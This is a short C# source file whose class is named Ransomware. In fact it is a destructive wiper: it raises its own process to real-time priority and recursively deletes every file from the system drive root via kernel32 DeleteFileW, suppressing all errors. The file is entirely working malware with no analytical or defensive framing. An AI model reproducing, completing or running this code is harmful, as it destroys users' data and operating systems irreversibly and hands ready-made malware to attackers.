using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class Ransomware
{
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)] string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetFileAttributes(string lpFileName, uint dwFileAttributes);

    public static void RunRansomware()
    {
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        Thread thread = new Thread(RansomwareThread);
        thread.Priority = ThreadPriority.Highest;
        thread.Start();
    }

    private static void RansomwareThread()
    {
        DestroyAllFiles(Environment.GetFolderPath(Environment.SpecialFolder.System).Substring(0, 1) + ":\\");
    }

    public static void DestroyAllFiles(string mainDirectory)
    {
        try
        {
            foreach (string file in Directory.GetFiles(mainDirectory))
            {
                try
                {
                    DestroyFile(file);
                }
                catch
                {

                }
            }
        }
        catch
        {

        }

        try
        {
            foreach (string directory in Directory.GetDirectories(mainDirectory))
            {
                try
                {
                    DestroyAllFiles(directory);
                }
                catch
                {

                }
            }
        }
        catch
        {

        }
    }

    public static void DestroyFile(string filePath)
    {
        DeleteFileW(filePath);
        SetFileAttributes(filePath, 0x03);
    }
}